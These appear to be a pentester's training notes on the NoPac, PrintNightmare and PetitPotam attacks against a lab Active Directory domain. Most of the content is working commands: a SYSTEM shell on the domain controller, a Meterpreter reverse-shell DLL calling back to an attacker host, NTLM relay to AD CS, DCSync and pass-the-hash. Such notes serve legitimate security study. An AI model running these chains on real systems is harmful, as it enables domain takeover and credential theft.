- These were recent as of April 2022.

# NoPac [(SamAccountName Spoofing](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699))

- This exploit path takes advantage of being able to change the `SamAccountName` of a computer to that of a Domain Controller.
- By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain).
	- When doing so, we change the name of the new host to match a DC's SamAccountName
- Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name.
	- When a TGS is requested it will issue the ticket with the closest matching name.
	- Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.  
- The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

- [noPac Tool on Github](https://github.com/Ridter/noPac)
	- Requires Impacket
- Has a scanner.py to check if the system is vulnerable and the exploit (noPac.py)

#### Scanning for NoPac
``` bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
- This will attempt to get a TGT from the target DC. If successful the system is vulnerable.
	- It will also return the  `ms-DS-MachineAccountQuota`. If this is set to zero the attack will fail because we will not have the right to add a new machine account. 

#### Running NoPac & Getting a Shell
``` bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- This is pretty noisy
	- The semi-interactive shell is established using smbexec.
		- With smbexec we need to use exact paths instead of navigating the directory structure using cd.

- NoPac.py also saves the TGT in the directory it was run.
	- We could then use the ccache file to perform a pass the ticket and other atacks like DCSync.

#### Using noPac to DCSync the Built In Admin Account
``` bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### SMBEXEC & Windows Defender Considerations

- We should be able to establish a shell session
	- However, if Windows Defender or any AV/EDR product on the target system will likely catch us running commands
- The first thing smbexec does is create a service called **BTOBTO**
	- Another service called **BTOBO** is created and any command we type is sent to the target over SMB inside a .bat file called **execute.bat**.
	- With each command we type a new bat file is sent, echoed to a temp file that runs the script and then deletes it from the system.

#### Windows Defender Quarantine Log
![[Pasted image 20230424183014.png|600]]

___
# PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.

The following exploit can allow us to gain a SYSTEM shell session on a DC running Server 2019.

Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit.

For this exploit to work we need to use cube0x0's version of Impacket

``` bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket && cd impacket
python3 ./setup.py install
```

#### Enumerate for MS-RPRN
``` bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
- We use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target. Once confirmed we can craft a DLL payload.

#### Generate a DLL Payload
``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
```

#### Create a Share with smbserver.py
``` bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

- **Config and Start MSF multi/handler**

#### Run the Exploit
``` bash
sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
```
___

# PetitPotam (MS-EFSRPC)

- PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31).
- This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.
-  In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate.
	- This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into detail on NTLM relaying to AD CS and the PetitPotam attack.

There is a powershell implementation [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
It has also been added to mimikatz and can be run by `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`


#### Start ntlmrelayx.py
- We need to start ntlmrelax.py on our attack host. We need to specify the:
	- Web Enrollment URL for the CA host and
	- Use either the KerberosAuthentication or DomainController AD CS template.
	- If we don't know the location of the CA we can use a tool like [certi](https://github.com/zer1t0/certi) to attempt to locate it.
``` bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

#### Run PetitPotam.py
- In a different console we run [PetitPotam.py](https://github.com/topotam/PetitPotam)
	- We run it with the command `python3 PetitPotam.py <attacker IP> <DC IP>` to attempt to coerce the DC to authenticate to our host where ntlmrelay is running.
```  bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

#### Catch Base64 Encoded Cert for DC01
- In the other window we should see a sucessful login request and obtain the base64 encoded cert for the DC.

#### Request a TGT using gettgtpkinit.py
``` bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base64 Cert> dc01.ccache
```
- We can request a TGT for the domain controller.

#### Set the KRB5CCNAME Enviroment Variable
``` bash
export KRB5CCNAME=dc01.ccache
```
- The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

#### Use the DC TGT to DCSync
``` bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
- We can then use the TGT with secretsdump.py to DCSync and obtain any NTLM hashes for the domain we want.
- We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file.
	- We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host.)

#### Confirm Admin Access to the Domain Controller
``` bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
- We can pass the hash for the admin account to auth to the DC.
___
### Alternate Method 1

#### Submit a TGS Request for Ourselves using getnthash.py )
``` bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

#### Use DC NTLM Hash to DCSync
``` bash 
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
___
### Alternate Method 2
- We can use Rubeus after we get the base64 cert with ntlmrelay to request a TGT and PTT all at once.

#### Request TGT and Performing PTT with DC01$ Machine Account
``` powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64cert> /ptt
```
- We can then use `klist` to make sure the ticket is in memory.

#### Perform DCSync with Mimikatz
``` powershell
.\mimikatz.exe

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```
- Since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.

